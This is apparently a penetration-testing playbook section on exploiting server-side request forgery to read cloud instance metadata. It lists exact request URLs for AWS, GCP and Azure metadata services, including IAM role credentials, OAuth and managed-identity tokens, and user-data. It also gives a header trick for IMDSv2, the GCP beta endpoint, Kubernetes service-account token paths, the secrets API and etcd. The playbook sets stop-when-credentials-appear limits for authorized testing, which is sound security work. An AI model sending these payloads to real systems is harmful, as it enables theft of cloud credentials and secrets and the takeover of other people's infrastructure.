# Cloud Metadata Extraction via SSRF

## When to Use

Consult when SSRF is confirmed (Phase 2 HIGH confidence) and target is cloud-hosted. This is the highest-impact SSRF exploitation path.

---

## AWS (Amazon Web Services)

### Metadata Endpoint
```
Base: http://169.254.169.254/latest/
```

### Enumeration Path (follow this sequence)

**Step 1: Confirm metadata access**
```
http://169.254.169.254/latest/meta-data/
```
Returns a list of metadata categories. If this works, proceed.

**Step 2: Instance identity**
```
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/placement/availability-zone
```

**Step 3: IAM Credentials (CRITICAL)**
```
# List available roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials for a specific role (replace ROLE_NAME)
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```
Returns JSON with: `AccessKeyId`, `SecretAccessKey`, `Token`, `Expiration`

**STOP HERE if credentials are returned.** Document the role name and that credentials are obtainable. Do NOT use the credentials for further access unless explicitly authorized.

**Step 4: User data (may contain secrets)**
```
http://169.254.169.254/latest/user-data
```
Often contains startup scripts with hardcoded credentials, API keys, database connection strings.

**Step 5: Network info (for pivoting context)**
```
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MACADDR/vpc-id
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MACADDR/subnet-id
```

### IMDSv2 Handling
AWS IMDSv2 requires a session token obtained via PUT:
```
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

Then include token in subsequent requests:
Header: X-aws-ec2-metadata-token: TOKEN_VALUE
```
If the SSRF allows custom headers and PUT method, IMDSv2 can still be exploited.

---

## GCP (Google Cloud Platform)

### Metadata Endpoint
```
Base: http://metadata.google.internal/computeMetadata/v1/
Required header: Metadata-Flavor: Google
```

**Without the header, GCP returns 403.** Test if SSRF allows custom headers.

### Enumeration Path

**Step 1: Service account info**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

**Step 2: Access token (CRITICAL)**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
Returns OAuth2 access token with scopes.

**Step 3: Project info**
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```

**Step 4: Instance attributes (may contain secrets)**
```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true
```

**Step 5: Kubernetes-specific (if GKE)**
```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```
May contain kubelet credentials.

### Beta API (sometimes less restricted)
```
http://metadata.google.internal/computeMetadata/v1beta1/
```
Older endpoint — does NOT require Metadata-Flavor header.

---

## Azure

### Metadata Endpoint
```
Base: http://169.254.169.254/metadata/
Required header: Metadata: true
API version required: ?api-version=2021-02-01
```

### Enumeration Path

**Step 1: Instance info**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
Returns comprehensive JSON with compute, network, storage info.

**Step 2: Managed identity token (CRITICAL)**
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Returns access token for Azure Resource Manager.

**Step 3: Subscription info**
```
http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text
```

**Step 4: Custom data**
```
http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01&format=text
```
May contain base64-encoded startup scripts.

---

## Kubernetes (any cloud)

If the target runs on Kubernetes:

### Service Account Token
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### Kubernetes API (if accessible)
```
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/pods
https://kubernetes.default.svc/api/v1/secrets
```
Use the service account token as Bearer auth.

### etcd (if exposed, typically port 2379)
```
http://127.0.0.1:2379/v2/keys/?recursive=true
```
Contains ALL cluster secrets in plaintext.

---

## Impact Classification

| Finding | Severity | Stop? |
|---------|----------|-------|
| Metadata endpoint accessible | High | Continue to credentials |
| IAM/service account credentials obtainable | Critical | YES — STOP |
| User-data contains hardcoded secrets | Critical | YES — STOP |
| Kubernetes service account token readable | Critical | YES — STOP |
| etcd accessible | Critical | YES — STOP |
| Network/instance info only (no credentials) | Medium | Document, continue |
